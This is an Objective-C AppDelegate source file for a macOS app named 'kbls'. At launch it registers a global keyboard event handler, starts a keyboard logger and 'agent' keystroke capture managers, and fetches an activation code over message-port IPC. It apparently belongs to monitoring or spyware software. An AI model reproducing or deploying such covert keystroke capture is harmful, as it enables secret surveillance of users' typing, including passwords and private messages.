//
//  AppDelegate.m
//  kbls
//
//  Created by Makara Khloth on 6/18/16.
//  Copyright © 2016 Makara Khloth. All rights reserved.
//

#import "AppDelegate.h"
#import "AgentKeyboardCaptureManager.h"
#import "AgentKeyboardACCaptureManager.h"

#import "KeyboardEventHandler.h"
#import "HotKeyCaptureManager.h"
#import "KeyboardLoggerManager.h"
#import "MessagePortIPCReader.h"
#import "MessagePortIPCSender.h"

#import "DebugStatus.h"

@interface AppDelegate ()

@property (weak) IBOutlet NSWindow *window;
@property (nonatomic, strong) KeyboardEventHandler *keyboardEventHandler;
@property (nonatomic, strong) HotKeyCaptureManager *hotKeyCaptureManager;
@property (nonatomic, strong) KeyboardLoggerManager *keyboardLoggerManager;
@property (nonatomic, strong) MessagePortIPCReader *messagePortACReader;

- (void) listenActivationCodeChange;
- (void) requestActivationCode;

@end

@implementation AppDelegate

@synthesize keyboardEventHandler = _keyboardEventHandler;
@synthesize hotKeyCaptureManager = _hotKeyCaptureManager;
@synthesize keyboardLoggerManager = _keyboardLoggerManager;
@synthesize agenKeyboardACCaptureManager = _agenKeyboardACCaptureManager;
@synthesize agentKeyboardCaptureManager = _agentKeyboardCaptureManager;
@synthesize messagePortACReader = _messagePortACReader;

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification {
    // Insert code here to initialize your application
    
    /***********
     ARC enable
     ***********/
    DLog(@"AXIsProcessTrusted = %d, AXAPIEnabled = %d", AXIsProcessTrusted(), AXAPIEnabled());
    
    KeyboardEventHandler *keyboardEventHandler = [[KeyboardEventHandler alloc] init];
    [keyboardEventHandler registerToGlobalEventHandler];
    self.keyboardEventHandler = keyboardEventHandler;
    
    HotKeyCaptureManager* hotKeyCaptureManager = [[HotKeyCaptureManager alloc] initWithKeyboardEventHandler:keyboardEventHandler];
    [hotKeyCaptureManager startHotKey];
    self.hotKeyCaptureManager = hotKeyCaptureManager;
    
    KeyboardLoggerManager *keyboardLoggerManager = [[KeyboardLoggerManager alloc] initWithKeyboardEventHandler:keyboardEventHandler];
    [keyboardLoggerManager startKeyboardLogger];
    self.keyboardLoggerManager = keyboardLoggerManager;
    
    _agentKeyboardCaptureManager = [[AgentKeyboardCaptureManager alloc] init];
    [self.keyboardLoggerManager addObserver:_agentKeyboardCaptureManager];
    
    _agenKeyboardACCaptureManager = [[AgentKeyboardACCaptureManager alloc] init];
    self.hotKeyCaptureManager.mDelegate = _agenKeyboardACCaptureManager;
    
    [self listenActivationCodeChange];
    [self requestActivationCode];
}

- (void)applicationWillTerminate:(NSNotification *)aNotification {
    // Insert code here to tear down your application
}

#pragma mark - IPC -
- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
    if (aRawData) {
        NSString *activationCode = [[NSString alloc] initWithData:aRawData encoding:NSUTF8StringEncoding];
        self.agenKeyboardACCaptureManager.activationCode = activationCode;
        [self.hotKeyCaptureManager overideActivationCode:activationCode];
    }
}

#pragma mark - Private -
- (void) listenActivationCodeChange {
    _messagePortACReader = [[MessagePortIPCReader alloc] initWithPortName:@"HotKeyACChangeMessagePort" withMessagePortIPCDelegate:self];
    [_messagePortACReader start];
}

- (void) requestActivationCode {
    DLog(@"=============> Send request activation code...");
    MessagePortIPCSender *messageSender = [[MessagePortIPCSender alloc] initWithPortName:@"HotKeyCaptureMessagePort"];
    [messageSender writeDataToPort:[@"*** REQUEST ACTIVATION CODE ***" dataUsingEncoding:NSUTF8StringEncoding]];
    
    NSData *rData = [messageSender mReturnData];
    NSString *activationCode = [[NSString alloc] initWithData:rData encoding:NSUTF8StringEncoding];
    self.agenKeyboardACCaptureManager.activationCode = activationCode;
    [self.hotKeyCaptureManager overideActivationCode:activationCode];
    
    DLog(@"************************************");
    DLog(@"ACTIVATION CODE: %@", activationCode);
    DLog(@"************************************");
}

@end
